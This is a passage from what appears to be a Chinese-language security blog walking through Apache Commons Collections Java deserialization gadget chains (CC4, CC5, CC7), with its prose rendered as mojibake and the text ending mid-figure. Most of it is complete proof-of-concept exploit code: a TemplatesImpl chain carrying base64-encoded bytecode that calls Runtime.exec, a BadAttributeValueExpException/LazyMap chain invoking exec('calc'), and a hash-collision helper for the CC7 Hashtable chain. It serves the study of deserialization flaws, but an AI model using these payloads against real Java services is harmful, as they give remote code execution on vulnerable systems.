java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMc2VyL2V2YWxDbGFzc1RlbXBsYXRlc0ltcGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACkBAApTb3VyY2VGaWxlAQAbZXZhbENsYXNzVGVtcGxhdGVzSW1wbC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEAGnNlci9ldmFsQ2xhc3NUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAJAA0AAAAMAAEAAAAFAA4ADwAAAAEAEAARAAIACwAAAD8AAAADAAAAAbEAAAACAAwAAAAGAAEAAAAVAA0AAAAgAAMAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAFAAVAAIAFgAAAAQAAQAXAAEAEAAYAAIACwAAAEkAAAAEAAAAAbEAAAACAAwAAAAGAAEAAAAaAA0AAAAqAAQAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAGQAaAAIAAAABABsAHAADABYAAAAEAAEAFwAIAB0ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAAwACQAPAAwADQANAA4AEQAQAA0AAAAMAAEADQAEAB4AHwAAACAAAAAHAAJMBwAhBAABACIAAAACACM=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templatesImpl &#125; ),<br>        &#125;;<br>        <span class="hljs-comment">//åŒ…è£…innerMapï¼Œå›è°ƒTransformedMap.decorate</span><br>        <span class="hljs-comment">//é˜²æ­¢payloadç”Ÿæˆè¿‡ç¨‹ä¸­è§¦å‘ï¼Œå…ˆæ”¾è¿›å»ä¸€ä¸ªç©ºçš„Transform</span><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br>        <span class="hljs-comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆå§‹åŒ–æ—¶çš„å¤§å°ï¼Œè‡³å°‘éœ€è¦2ä¸ªå…ƒç´ æ‰ä¼šè§¦å‘æ’åºå’Œæ¯”è¾ƒ</span><br>        <span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¯”è¾ƒæ—¶çš„Comparatorï¼Œä¼ å…¥å‰é¢å®ä¾‹åŒ–çš„comparator</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br>        <span class="hljs-comment">//ç”Ÿæˆåºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-comment">//System.out.println(barr);</span><br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728230441860.png" alt="image-20240728230441860"></p><p>ä¸è¿‡è¿™æ¡åˆ©ç”¨é“¾åœ¨<code>commons-collections3</code>æ˜¯æ— æ³•ä¸­åˆ©ç”¨çš„ã€‚</p><p>å› ä¸º<code>org.apache.commons.collections4.comparators.TransformingComparator</code>åœ¨<code>commons-collections4.0</code>ä¹‹å‰æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•åºåˆ—åŒ–ã€‚</p><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>è¿™ä¸ªé“¾ä¸»è¦æ˜¯ä¸ºäº†è§£å†³é«˜ç‰ˆæœ¬åˆ©ç”¨é—®é¢˜ï¼Œä½¿ç”¨<code>BadAttributeValueExpException</code>æ›¿æ¢<code>AnnotationInvocationHandler</code>é…åˆ<code>TiedMapEntry#toString()</code>å»ä¸²è”<code>LazyMap#get()</code>è°ƒç”¨<code>transform()</code>è§¦å‘<code>ChainedTransformer</code>æ¶æ„å¯¹è±¡åå°„é“¾ã€‚</p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢CC1è°ˆåˆ°çš„ï¼š</p><p>åœ¨8u71ä»¥åJavaå®˜æ–¹ä¿®æ”¹äº†<code>sun.reflect.annotation.AnnotationInvocationHandler</code>çš„<code>readObject</code>å‡½æ•°ï¼š<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p>æ”¹åŠ¨åï¼Œä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ï¼Œä¼ è¿›å»çš„æ¶æ„Mapä¸å†æ‰§è¡Œsetæˆ–putæ“ä½œï¼Œä¾¿æ— æ³•è§¦å‘<code>transform</code>ã€‚</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>    BadAttributeValueExpException#readObject()<br>    TiedMapEntry#toString()<br>    LazyMap#get()<br>                       <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>    ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>å€Ÿç”¨å­¦é•¿çš„æ”¹æ”¹ï¼ŒåŒæ—¶æŠŠserializeå’Œdeserializeå†™è¿›å‡½æ•°é‡Œï¼Œç®—æ˜¯æ¢ä¸€ç§ä»£ç é£æ ¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ChainedTransformer chain=getChainedTransformer();<br>        Map lazymap=LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),chain);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-number">1</span>);<br>        BadAttributeValueExpException e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(e,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br>        deserialize(serialize(e));<br>    &#125;<br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span>&#123;<br>        ConstantTransformer ct=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        InvokerTransformer it1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it_exec=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct,it1,it2,it_exec&#125;;<br>        ChainedTransformer chain=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>        <span class="hljs-keyword">return</span> chain;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728231404160.png" alt="image-20240728231404160"></p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>CC7å‹è½´ã€‚</p><p>å› ä¸ºå®ƒçœŸçš„å¾ˆç»•ã€‚æ‰“çš„è¿˜æ˜¯<code>CommonsCollections 3.1 - 3.2.1</code></p><p>æ¢äº†<code>Hashtable</code>ç±»ï¼Œåˆ©ç”¨å…¶<code>reconstitutionPut</code>æ–¹æ³•ä¸­æ¯”è¾ƒkeyçš„å€¼ï¼Œä¼šè°ƒç”¨LazyMapçš„equalsæ–¹æ³•ã€‚</p><h3 id="ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap"><a href="#ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap" class="headerlink" title="ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap"></a>ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap</h3><p>å› ä¸ºä¸ºäº†è¿›<code>reconstitutionPut</code> <code>for</code>å¾ªç¯ï¼Œ<code>tab</code>éœ€è¦ä¸ä¸ºç©ºã€‚</p><p><code>tab</code>å…¶å®å°±æ˜¯<code>hashtable</code>ï¼Œ<code>entry</code>æ˜¯å•é“¾ï¼ŒåŠ¨è°ƒèƒ½å‘ç°<code>put</code>ä¸¤ä¸ªçš„æ—¶å€™èƒ½è®©<code>tab</code>ä¸ä¸ºç©º</p><img src="/2024/07/28/Commons-Collections/image-20240728232740736.png" class="" title="image-20240728232740736"><h3 id="å“ˆå¸Œç¢°æ’"><a href="#å“ˆå¸Œç¢°æ’" class="headerlink" title="å“ˆå¸Œç¢°æ’"></a>å“ˆå¸Œç¢°æ’</h3><p><code>if</code>è¿™ä¸€è¡Œç”±äºç”¨ <code>&amp;&amp;</code> è¿æ¥ï¼Œå·¦è¾¹ä¸º<code>false</code>å°±ä¸ä¼šæ‰§è¡Œå³è¾¹ã€‚</p><p>è¿™ä¸¤ä¸ª<code>hash</code>å¯¹åº”å½“å‰<code>key</code>å’Œä¸Šä¸€ä¸ª<code>key</code>çš„<code>hashcode</code>ï¼š</p><img src="/2024/07/28/Commons-Collections/image-20240728233018118.png" class="" title="image-20240728233018118"><p>è¿™é‡Œkeyæˆ‘ä»¬é€‰æ‹©çš„æ˜¯Stringï¼Œè§‚å¯Ÿ<code>String.hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>çˆ†ç ´ä¸¤ä½å°±å¯:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashCollision</span> &#123;<br>    <span class="hljs-keyword">static</span> String dict=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> len=dict.length();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a1=<span class="hljs-number">0</span>;a1&lt;len;a1++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a2=<span class="hljs-number">0</span>;a2&lt;len;a2++)&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b1=<span class="hljs-number">0</span>;b1&lt;len;b1++)&#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b2=<span class="hljs-number">0</span>;b2&lt;len;b2++)&#123;<br>                        <span class="hljs-keyword">if</span>(a1!=b1&amp;&amp;a2!=b2)&#123;<br>                            String s1=get(a1)+get(a2);<br>                            String s2=get(b1)+get(b2);<br>                            <span class="hljs-keyword">if</span>(s1.hashCode()==s2.hashCode())&#123;<br>                                System.out.println(s1+<span class="hljs-string">&quot;\n&quot;</span>+s2);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;fuck&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <span class="hljs-keyword">return</span>  String.valueOf(dict.charAt(i));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆmap2-remove-00"><a href="#ä¸ºä»€ä¹ˆmap2-remove-00" class="headerlink" title="ä¸ºä»€ä¹ˆmap2.remove(&quot;00&quot;);"></a>ä¸ºä»€ä¹ˆ<code>map2.remove(&quot;00&quot;);</code></h3><p>å…¶å®å’Œä¸Šé¢çš„CommonsCollections6ä¸€æ ·é“ç†ï¼Œ<code>hashtable.put(map2, 1);</code>è¿™ä¸€è¡Œä¹Ÿä¼šè°ƒç”¨<code>lazymap.get</code>ï¼Œä»è€Œå¤šåŠ äº†ä¸€ä¸ªå¸¦ç€<code>processImpl</code>çš„å…ƒç´ ï¼Œä¸èƒ½åºåˆ—åŒ–ã€‚</p><p><img src="/2024/07/28/Commons-Collections/image-20240728233236250.png" alt="image-20240728233236250"></p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Hashtable#readObject()<br>    Hashtable#reconstitutionPut()<br>AbstractMapDecorator#equals()<br>    AbstractMap#equals()<br>    LazyMap#get()<br>                                <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>    ChainedTransformer#transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 